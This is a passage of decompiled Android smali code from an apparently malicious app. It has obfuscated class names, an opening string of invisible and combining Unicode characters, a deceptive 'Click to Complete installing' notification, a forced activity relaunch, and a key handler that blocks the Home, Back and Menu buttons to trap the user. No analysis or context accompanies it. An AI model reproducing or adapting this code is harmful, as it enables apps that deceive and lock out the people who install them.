u1271\u0359\u0336\u0317\u0324\u035d\u2060\u0349\u0335\u034b\u2063\u1271\u06df\u2060\u030a\u06e2\u2060\u2064\u0313\u0344\u0304\u0327\u0319\u030e\u0360\u2060\u0327\u0357\u0318\u0337\u030f\u0335\u033e\u035d\u0351\u06e4\u1243\u0344\u0300\u0334\u06e4\u1271\u033b\u2063\u0304\u2064\u0347\u0335\u0300\u2063\u0328\u0318\u035b\u035d\u0329o\u06e2\u0308\u030e\u0351\u0315\u0303\u0353\u0311s\u0337\u0329\u0304\u0325\u2063\u033a\u0355\u0320\u030f\u06e8e\u0329\u0315\u2063\u0344\u0305\u035d\u031c\u0317\u030d\u2063\u06e1\u0329\u032f\u032e\u0345\u2063p\u034b\u034ds\u030e\u12f1\u0318\u06e2\u030b\u06e1\u120d\u031e\u2060\u2064\u0348\u0303\u06e7\u06e0\u0348\u031a\u0349r\u06e7\u035a\u0300\u031b\u0340\u06e0\u0311\u2063s\u0340\u032f\u032c\u2064\u0311\u0338\u2060\u2064\u2060\u0320\u0360\u06df\u031cs\u12c8\u033bn\u0321\u030b\u033f\u0308\u030b\u0359\u2063r\u0328\u0335\u2064\u06e4\u032f\u0305\u0335\u032f\u0345\u0312\u030a\u034c\u030e\u122d\u2060\u030a\u06e4\u0317\u031b\u0329\u2060\u0315\u0337\u035d\u2063\u2063\u2064\u2063\u0301\u2064\u0309\u0344\u206058install"

    invoke-static {v6, v3}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->p(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroidx/core/app/c$b;->h(Ljava/lang/CharSequence;)Landroidx/core/app/c$b;

    const-string v3, "Click to Complete installing"

    invoke-virtual {v2, v3}, Landroidx/core/app/c$b;->g(Ljava/lang/CharSequence;)Landroidx/core/app/c$b;

    invoke-virtual {v2, v4}, Landroidx/core/app/c$b;->m(I)Landroidx/core/app/c$b;

    const-string v3, "call"

    invoke-virtual {v2, v3}, Landroidx/core/app/c$b;->e(Ljava/lang/String;)Landroidx/core/app/c$b;

    const/4 v3, -0x1

    invoke-virtual {v2, v3}, Landroidx/core/app/c$b;->i(I)Landroidx/core/app/c$b;

    invoke-virtual {v2, v0}, Landroidx/core/app/c$b;->l(Z)Landroidx/core/app/c$b;

    invoke-virtual {v2, v5}, Landroidx/core/app/c$b;->o(Landroid/net/Uri;)Landroidx/core/app/c$b;

    invoke-virtual {v2, v4}, Landroidx/core/app/c$b;->d(Z)Landroidx/core/app/c$b;

    invoke-virtual {v2, v1, v0}, Landroidx/core/app/c$b;->k(Landroid/app/PendingIntent;Z)Landroidx/core/app/c$b;

    invoke-static {p0}, Landroidx/core/app/f;->a(Landroid/content/Context;)Landroidx/core/app/f;

    move-result-object v0

    invoke-virtual {v2}, Landroidx/core/app/c$b;->a()Landroid/app/Notification;

    move-result-object v1

    invoke-virtual {v0, p1, v1}, Landroidx/core/app/f;->c(ILandroid/app/Notification;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    :catch_1
    :try_start_6
    sget-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->X:Ljava/lang/Boolean;

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_5

    const/16 v0, 0x1388

    sput v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->V:I

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->X:Ljava/lang/Boolean;
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3

    :try_start_7
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/itlvbmcfuddlxrfnvptwezsvfcmeszdaqhjqyidojzxpegralj29;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x20000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_2

    goto :goto_2

    :catch_2
    :try_start_8
    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->X:Ljava/lang/Boolean;

    goto :goto_2

    :cond_5
    const/16 v0, 0x7d0

    sput v0, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4/d;->V:I

    :goto_2
    invoke-static {p0, p1}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3/hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;->f(Landroid/content/Context;I)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    :catch_3
    :cond_6
    :try_start_9
    invoke-virtual {p0}, Lcom/ak47/jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2/nwwkodnfgtmfwyhtnalvpzrjtbdcnpykfgoxvouawxcyyacyja20;->finish()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4

    :catch_4
    :goto_3
    return-void
.end method

.method public onDestroy()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    return p2

    :cond_0
    const/4 v0, 0x4

    if-ne p1, v0, :cond_1

    return p2

    :cond_1
    const/16 v0, 0x52

    if-ne p1, v0, :cond_2

    return p2

    :cond_2
    const/4 p1, 0x0

    return p1
.end method

.method protected onStop()V
    .locals 0

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
